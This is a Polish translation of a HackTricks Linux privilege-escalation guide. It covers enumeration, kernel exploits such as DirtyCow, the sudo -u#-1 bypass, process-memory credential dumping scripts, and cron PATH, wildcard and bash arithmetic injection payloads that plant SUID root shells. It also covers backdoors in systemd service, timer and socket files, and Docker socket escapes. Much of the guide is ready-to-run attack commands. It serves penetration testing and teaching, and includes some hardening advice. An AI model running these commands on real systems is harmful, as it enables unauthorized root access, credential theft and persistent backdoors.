# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Informacje o systemie

### Informacje o systemie (OS)

Zacznijmy zbierać informacje o działającym systemie (OS).
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Ścieżka

Jeśli masz **uprawnienia zapisu w dowolnym folderze znajdującym się w zmiennej `PATH`**, możesz być w stanie przejąć niektóre biblioteki lub pliki binarne:
```bash
echo $PATH
```
### Informacje o środowisku

Czy w zmiennych środowiskowych znajdują się interesujące informacje, hasła lub klucze API?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Sprawdź wersję kernela i czy istnieje jakiś exploit, który można użyć do escalate privileges
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Możesz znaleźć dobrą listę podatnych wersji jądra i kilka już **compiled exploits** tutaj: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) i [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Inne strony, gdzie możesz znaleźć kilka **compiled exploits**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Aby wyodrębnić wszystkie podatne wersje jądra ze tej strony możesz zrobić:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Narzędzia, które mogą pomóc w wyszukiwaniu kernel exploits to:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (execute IN victim,only checks exploits for kernel 2.x)

Zawsze **search the kernel version in Google**, być może twoja wersja kernela jest wymieniona w jakimś kernel exploit i wtedy będziesz mieć pewność, że exploit jest ważny.

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo wersja

Na podstawie podatnych wersji sudo, które pojawiają się w:
```bash
searchsploit sudo
```
Możesz sprawdzić, czy wersja sudo jest podatna, korzystając z poniższego polecenia grep.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
#### sudo < v1.28

Od @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg: weryfikacja podpisu nie powiodła się

Sprawdź **smasher2 box of HTB** dla **przykładu**, jak tę vuln można wykorzystać
```bash
dmesg 2>/dev/null | grep "signature"
```
### Więcej enumeracji systemu
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Wymień możliwe mechanizmy obronne

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

Jeśli jesteś wewnątrz docker container, możesz spróbować wydostać się z niego:


{{#ref}}
docker-security/
{{#endref}}

## Dyski

Sprawdź **what is mounted and unmounted**, gdzie i dlaczego. Jeśli coś jest unmounted, możesz spróbować to mount i sprawdzić prywatne informacje
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Przydatne oprogramowanie

Wypisz przydatne binaries
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Sprawdź też, czy **zainstalowany jest jakiś compiler**. To przydatne, jeśli musisz użyć jakiegoś kernel exploit, ponieważ zaleca się skompilować go na maszynie, na której zamierzasz go użyć (lub na podobnej).
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Zainstalowane podatne oprogramowanie

Sprawdź **wersję zainstalowanych pakietów i usług**. Być może istnieje jakaś stara wersja Nagios (na przykład), która mogłaby zostać wykorzystana do escalating privileges…\
Zaleca się ręczne sprawdzenie wersji bardziej podejrzanego zainstalowanego oprogramowania.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
Jeśli masz dostęp SSH do maszyny, możesz także użyć **openVAS**, aby sprawdzić, czy na niej zainstalowane jest przestarzałe lub podatne oprogramowanie.

> [!NOTE] > _Należy pamiętać, że te polecenia wyświetlą dużo informacji, które w większości będą bezużyteczne, dlatego zaleca się użycie aplikacji takich jak OpenVAS lub podobnych, które sprawdzą, czy jakakolwiek z zainstalowanych wersji oprogramowania jest podatna na znane exploity_

## Procesy

Sprawdź, jakie **procesy** są uruchamiane i zobacz, czy któryś proces nie ma **więcej uprawnień, niż powinien** (np. tomcat uruchomiony przez root?)
```bash
ps aux
ps -ef
top -n 1
```
Always check for possible [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md). **Linpeas** wykrywa je poprzez sprawdzanie parametru `--inspect` w linii poleceń procesu.\
Również **sprawdź swoje uprawnienia wobec binarek procesów**, być może możesz nadpisać którąś.

### Monitorowanie procesów

Możesz użyć narzędzi takich jak [**pspy**](https://github.com/DominicBreuker/pspy) do monitorowania procesów. Może to być bardzo przydatne do identyfikowania podatnych procesów uruchamianych często lub gdy spełnione są pewne warunki.

### Pamięć procesu

Niektóre usługi serwera zapisują **credentials w postaci jawnego tekstu w pamięci**.\
Zazwyczaj będziesz potrzebować **root privileges** żeby odczytać pamięć procesów należących do innych użytkowników, dlatego jest to zwykle bardziej przydatne, gdy jesteś już root i chcesz odnaleźć więcej credentials.\
Pamiętaj jednak, że **jako zwykły użytkownik możesz czytać pamięć procesów, które posiadasz**.

> [!WARNING]
> Zwróć uwagę, że obecnie większość maszyn **nie zezwala domyślnie na ptrace**, co oznacza, że nie możesz zrzucać pamięci procesów należących do innego użytkownika.
>
> Plik _**/proc/sys/kernel/yama/ptrace_scope**_ kontroluje dostępność ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: wszystkie procesy mogą być debugowane, o ile mają ten sam uid. To klasyczny sposób działania ptrace.
> - **kernel.yama.ptrace_scope = 1**: tylko proces macierzysty może być debugowany.
> - **kernel.yama.ptrace_scope = 2**: tylko admin może używać ptrace, ponieważ wymagana jest capability CAP_SYS_PTRACE.
> - **kernel.yama.ptrace_scope = 3**: żadne procesy nie mogą być śledzone za pomocą ptrace. Po ustawieniu tej wartości wymagany jest reboot, aby ponownie włączyć ptrace.

#### GDB

Jeśli masz dostęp do pamięci serwisu FTP (na przykład), możesz uzyskać Heap i przeszukać go w poszukiwaniu credentials.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB Skrypt
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Dla danego identyfikatora procesu **maps pokazują, jak pamięć jest mapowana w jego** wirtualnej przestrzeni adresowej; pokazują też **uprawnienia każdego mapowanego regionu**. Pseudoplik **mem** **udostępnia samą pamięć procesu**. Z pliku **maps** wiemy, które **regiony pamięci są odczytywalne** oraz ich offsety. Wykorzystujemy te informacje, aby **przejść do odpowiednich miejsc w pliku mem i zrzucić wszystkie odczytywalne regiony** do pliku.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` udostępnia dostęp do **pamięci fizycznej** systemu, a nie pamięci wirtualnej. Do wirtualnej przestrzeni adresowej jądra można uzyskać dostęp za pomocą /dev/kmem.\
Zazwyczaj `/dev/mem` jest czytelny tylko dla **root** i grupy **kmem**.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump for linux

ProcDump to implementacja na Linux klasycznego narzędzia ProcDump z pakietu narzędzi Sysinternals dla Windows. Pobierz je z [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Narzędzia

Aby zrzucić pamięć procesu możesz użyć:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Możesz ręcznie usunąć wymagania dotyczące root i zrzucić proces należący do ciebie
- Skrypt A.5 z [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (wymagany root)

### Dane uwierzytelniające z pamięci procesu

#### Przykład ręczny

Jeśli stwierdzisz, że proces authenticator jest uruchomiony:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Możesz dump the process (zobacz wcześniejsze sekcje, aby znaleźć różne sposoby na dump the memory of a process) i wyszukać credentials inside the memory:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

Narzędzie [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) będzie **wykradać dane uwierzytelniające w postaci jawnego tekstu z pamięci** oraz z niektórych **dobrze znanych plików**. Wymaga uprawnień root, aby działać poprawnie.

| Funkcja                                           | Nazwa procesu         |
| ------------------------------------------------- | -------------------- |
| GDM password (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Active FTP Connections)                   | vsftpd               |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2              |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                |

#### Regexy wyszukiwania/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Zadania zaplanowane/Cron

### Crontab UI (alseambusher) running as root – web-based scheduler privesc

Jeśli webowy panel "Crontab UI" (alseambusher/crontab-ui) działa jako root i jest powiązany tylko z loopback, nadal możesz uzyskać do niego dostęp przez SSH local port-forwarding i utworzyć uprzywilejowane zadanie w celu eskalacji.

Typowy łańcuch
- Odkryj port dostępny tylko z loopback (np., 127.0.0.1:8000) i Basic-Auth realm przez `ss -ntlp` / `curl -v localhost:8000`
- Znajdź poświadczenia w artefaktach operacyjnych:
  - Kopie zapasowe/skrypty z `zip -P <password>`
  - jednostka systemd ujawniająca `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."`
- Tuneluj i zaloguj się:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Utwórz zadanie o wysokich uprawnieniach i uruchom je natychmiast (zrzuca SUID shell):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Użyj tego:
```bash
/tmp/rootshell -p   # root shell
```
Wzmacnianie
- Nie uruchamiaj Crontab UI jako root; ogranicz go do dedykowanego użytkownika i minimalnych uprawnień
- Nasłuchuj na localhost i dodatkowo ogranicz dostęp przez firewall/VPN; nie używaj ponownie haseł
- Unikaj umieszczania secrets w unit files; użyj secret stores lub root-only EnvironmentFile
- Włącz audit/logging dla wykonywania zadań na żądanie

Sprawdź, czy któreś zaplanowane zadanie jest podatne. Może możesz wykorzystać skrypt uruchamiany przez root (wildcard vuln? można modyfikować pliki używane przez root? użyć symlinks? utworzyć konkretne pliki w katalogu używanym przez root?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Ścieżka Cron

Na przykład, wewnątrz _/etc/crontab_ możesz znaleźć PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Zwróć uwagę, że użytkownik "user" ma uprawnienia zapisu w /home/user_)

Jeśli wewnątrz tego crontab użytkownik root próbuje wykonać jakieś polecenie lub skrypt bez ustawienia PATH. Na przykład: _\* \* \* \* root overwrite.sh_\

Wtedy możesz uzyskać root shell używając:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron używający skryptu ze znakiem wieloznacznym (Wildcard Injection)

Jeżeli skrypt uruchamiany przez root ma w poleceniu “**\***”, możesz to exploitować, aby spowodować nieoczekiwane zachowanie (np. privesc). Przykład:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Jeśli wildcard jest poprzedzony ścieżką taką jak** _**/some/path/\***_ **, nie jest podatny (nawet** _**./\***_ **nie jest).**

Przeczytaj następującą stronę, aby poznać więcej trików wykorzystania wildcard:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash wykonuje parameter expansion i command substitution przed arithmetic evaluation w ((...)), $((...)) i let. Jeśli root cron/parser odczytuje niezaufane pola logów i przekazuje je do arithmetic context, atakujący może wstrzyknąć command substitution $(...), które wykona się jako root, gdy cron zostanie uruchomiony.

- Dlaczego to działa: W Bash rozszerzenia zachodzą w następującej kolejności: parameter/variable expansion, command substitution, arithmetic expansion, potem word splitting i pathname expansion. Dlatego wartość taka jak `$(/bin/bash -c 'id > /tmp/pwn')0` jest najpierw podmieniana (uruchamiając polecenie), a pozostała część numeryczna `0` jest użyta do obliczeń arytmetycznych, dzięki czemu skrypt kontynuuje bez błędów.

- Typowy podatny wzorzec:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Eksploatacja: Spowoduj zapisanie attacker-controlled tekstu w analizowanym logu tak, aby pole wyglądające na liczbę zawierało command substitution i kończyło się cyfrą. Upewnij się, że twoje polecenie nie wypisuje nic na stdout (lub przekieruj jego wyjście), aby obliczenie arytmetyczne pozostało ważne.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

Jeśli możesz **modyfikować cron script** uruchamiany przez root, możesz bardzo łatwo uzyskać shell:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Jeśli skrypt uruchamiany przez root używa **katalogu, do którego masz pełny dostęp**, może być użyteczne usunięcie tego folderu i **utworzenie katalogu-symlink wskazującego na inny**, zawierającego skrypt kontrolowany przez ciebie.
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Częste cron jobs

Możesz monitorować procesy, aby wyszukać procesy wykonywane co 1, 2 lub 5 minut. Być może możesz to wykorzystać i escalate privileges.

Na przykład, aby **monitorować co 0.1s przez 1 minutę**, **posortować według rzadziej wykonywanych poleceń** i usunąć polecenia, które były wykonywane najczęściej, możesz zrobić:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Możesz również użyć** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (to będzie monitorować i wypisywać każdy proces, który się uruchamia).

### Niewidoczne cron jobs

Można stworzyć cronjob **umieszczając znak powrotu karetki po komentarzu** (bez znaku nowej linii), i cron job będzie działać. Przykład (zwróć uwagę na znak powrotu karetki):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Usługi

### Zapisywalne _.service_ pliki

Sprawdź, czy możesz zapisać jakikolwiek plik `.service`, jeśli możesz, **możesz go zmodyfikować** tak, aby **uruchamiał** twój **backdoor gdy** usługa jest **uruchamiana**, **restartowana** lub **zatrzymywana** (może będziesz musiał poczekać, aż maszyna zostanie uruchomiona ponownie).\
Na przykład stwórz swój backdoor wewnątrz pliku .service z **`ExecStart=/tmp/script.sh`**

### Pliki binarne usług z prawem zapisu

Pamiętaj, że jeśli masz **uprawnienia zapisu do binariów uruchamianych przez usługi**, możesz je zmienić na backdoory, więc gdy usługi zostaną ponownie uruchomione, backdoory zostaną uruchomione.

### systemd PATH - Ścieżki względne

Możesz zobaczyć PATH używany przez **systemd** za pomocą:
```bash
systemctl show-environment
```
Jeśli odkryjesz, że możesz **zapisywać** w którymkolwiek z katalogów na tej ścieżce, możesz być w stanie **escalate privileges**. Musisz wyszukać **używanie ścieżek względnych w plikach konfiguracji usług** takich jak:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Następnie utwórz **plik wykonywalny** o **tej samej nazwie co relatywna ścieżka binarki** w folderze PATH systemd, do którego masz uprawnienia zapisu, a gdy serwis zostanie poproszony o wykonanie podatnej akcji (**Start**, **Stop**, **Reload**), Twój **backdoor zostanie uruchomiony** (użytkownicy bez uprawnień zwykle nie mogą uruchamiać/zatrzymywać usług, ale sprawdź, czy możesz użyć `sudo -l`).

**Dowiedz się więcej o usługach za pomocą `man systemd.service`.**

## **Timery**

**Timery** to pliki jednostek systemd, których nazwa kończy się na `**.timer**`, i które kontrolują pliki `**.service**` lub zdarzenia. **Timery** mogą być używane jako alternatywa dla cron, ponieważ mają wbudowane wsparcie dla zdarzeń czasowych kalendarza oraz zdarzeń monotonicznych i mogą być uruchamiane asynchronicznie.

Możesz wyświetlić wszystkie timery za pomocą:
```bash
systemctl list-timers --all
```
### Zapisywalne timery

Jeśli możesz zmodyfikować timer, możesz sprawić, że uruchomi istniejące jednostki systemd.unit (takie jak `.service` lub `.target`).
```bash
Unit=backdoor.service
```
W dokumentacji możesz przeczytać, czym jest Unit:

> Jednostka, która ma zostać aktywowana, gdy ten timer wygaśnie. Argument to nazwa jednostki, której sufiks nie jest ".timer". Jeśli nie zostanie określony, ta wartość domyślnie wskazuje na service o tej samej nazwie co jednostka timer, z wyjątkiem sufiksu. (Patrz wyżej.) Zaleca się, aby nazwa jednostki aktywowanej oraz nazwa jednostki timer były identyczne, z wyjątkiem sufiksu.

Dlatego, aby nadużyć tego uprawnienia, musisz:

- Znaleźć jakąś unit systemd (np. `.service`), która **uruchamia zapisywalny plik binarny**
- Znaleźć jakąś unit systemd, która **uruchamia względną ścieżkę** i masz **prawa zapisu** do **systemd PATH** (aby podszyć się pod ten plik wykonywalny)

**Dowiedz się więcej o timerach za pomocą `man systemd.timer`.**

### **Włączanie timera**

Aby włączyć timer, potrzebujesz uprawnień root i musisz wykonać:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Zwróć uwagę, że **timer** jest **aktywowany** przez utworzenie dowiązania symbolicznego do niego w `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Gniazda

Unix Domain Sockets (UDS) umożliwiają **komunikację między procesami** na tej samej lub różnych maszynach w modelu klient-serwer. Wykorzystują standardowe pliki deskryptorów Unix do komunikacji między komputerami i są konfigurowane za pomocą plików `.socket`.

Sockets can be configured using `.socket` files.

**Dowiedz się więcej o sockets za pomocą `man systemd.socket`.** W tym pliku można skonfigurować kilka interesujących parametrów:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Te opcje różnią się, ale w skrócie służą do **wskazania, gdzie socket będzie nasłuchiwał** (ścieżka pliku gniazda AF_UNIX, adres IPv4/6 i/lub numer portu do nasłuchu itp.)
- `Accept`: Przyjmuje argument typu boolean. Jeśli **true**, dla każdego przychodzącego połączenia **tworzona jest instancja service** i przekazywany jest do niej tylko socket połączenia. Jeśli **false**, wszystkie gniazda nasłuchujące są **przekazywane do uruchomionej jednostki service**, i tworzona jest tylko jedna jednostka service dla wszystkich połączeń. Ta wartość jest ignorowana dla socketów datagramowych i FIFO, gdzie pojedyncza jednostka service bezwarunkowo obsługuje cały ruch przychodzący. **Domyślnie** `false`. Ze względów wydajnościowych zaleca się pisać nowe demony tak, aby były zgodne z `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: Przyjmują jedną lub więcej linii poleceń, które są **wykonywane przed** lub **po** utworzeniu i powiązaniu nasłuchujących **socketów**/FIFO, odpowiednio. Pierwszym tokenem linii poleceń musi być absolutna ścieżka pliku wykonywalnego, a następnie argumenty dla procesu.
- `ExecStopPre`, `ExecStopPost`: Dodatkowe **polecenia**, które są **wykonywane przed** lub **po** zamknięciu i usunięciu nasłuchujących **socketów**/FIFO, odpowiednio.
- `Service`: Określa nazwę jednostki **service**, którą należy **aktywować** przy **ruchu przychodzącym**. To ustawienie jest dozwolone tylko dla socketów z Accept=no. Domyślnie wskazuje na service o tej samej nazwie co socket (z odpowiednią zmianą sufiksu). W większości przypadków nie jest konieczne używanie tej opcji.

### Zapisowalne pliki `.socket`

Jeśli znajdziesz **zapisowalny** plik `.socket`, możesz **dodać** na początku sekcji `[Socket]` coś w stylu: `ExecStartPre=/home/kali/sys/backdoor` i backdoor zostanie wykonany zanim socket zostanie utworzony. W związku z tym **prawdopodobnie będziesz musiał poczekać na reboot maszyny.**\
_Należy pamiętać, że system musi korzystać z tej konfiguracji pliku socket, w przeciwnym razie backdoor nie zostanie uruchomiony_

### Zapisowalne gniazda

Jeśli **zidentyfikujesz któreś zapisowalne gniazdo** (_mówimy tu o Unix Sockets, a nie o plikach konfiguracyjnych `.socket`_), to **możesz komunikować się** z tym gniazdem i być może wykorzystać jakąś lukę.

### Enumeracja Unix Domain Sockets
```bash
netstat -a -p --unix
```
### Surowe połączenie
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Exploitation example:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

Zwróć uwagę, że może istnieć kilka **sockets listening for HTTP** requests (_Nie mam na myśli .socket files, lecz plików działających jako unix sockets_). Możesz to sprawdzić za pomocą:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
Jeśli socket **odpowiada na żądanie HTTP**, możesz się z nim **komunikować** i być może **exploit some vulnerability**.

### Zapisywalny Docker socket

Docker socket, często znajdujący się w `/var/run/docker.sock`, to krytyczny plik, który należy zabezpieczyć. Domyślnie jest zapisywalny przez użytkownika `root` i członków grupy `docker`. Posiadanie dostępu zapisu do tego socketu może prowadzić do eskalacji uprawnień. Poniżej opisano, jak można to zrobić, oraz alternatywne metody, jeśli Docker CLI nie jest dostępne.

#### **Privilege Escalation with Docker CLI**

Jeśli masz dostęp zapisu do Docker socket, możesz eskalować uprawnienia, używając następujących poleceń:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Te polecenia pozwalają uruchomić kontener z dostępem root do systemu plików hosta.

#### **Używanie Docker API bezpośrednio**

W sytuacjach, gdy Docker CLI nie jest dostępny, Docker socket można nadal obsługiwać przy pomocy Docker API i poleceń `curl`.

1.  **List Docker Images:** Pobierz listę dostępnych obrazów.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** Wyślij żądanie utworzenia kontenera, który montuje katalog root hosta.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Start the newly created container:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** Użyj `socat`, aby nawiązać połączenie z kontenerem, umożliwiając wykonywanie poleceń w jego wnętrzu.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

Po nawiązaniu połączenia `socat` możesz wykonywać polecenia bezpośrednio w kontenerze z dostępem root do systemu plików hosta.

### Inne

Zauważ, że jeśli masz uprawnienia zapisu do docker socket, ponieważ jesteś **wewnątrz grupy `docker`**, masz [**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group). Jeśli [**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Sprawdź **more ways to break out from docker or abuse it to escalate privileges** w:


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) eskalacja uprawnień

Jeśli możesz użyć polecenia **`ctr`**, przeczytaj następującą stronę — **możesz być w stanie wykorzystać je do eskalacji uprawnień**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** eskalacja uprawnień

Jeśli możesz użyć polecenia **`runc`**, przeczytaj następującą stronę — **możesz być w stanie wykorzystać je do eskalacji uprawnień**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus to zaawansowany system komunikacji międzyprocesowej (IPC), który umożliwia aplikacjom efektywną współpracę i wymianę danych. Zaprojektowany z myślą o nowoczesnym systemie Linux, oferuje solidne ramy dla różnych form komunikacji między aplikacjami.

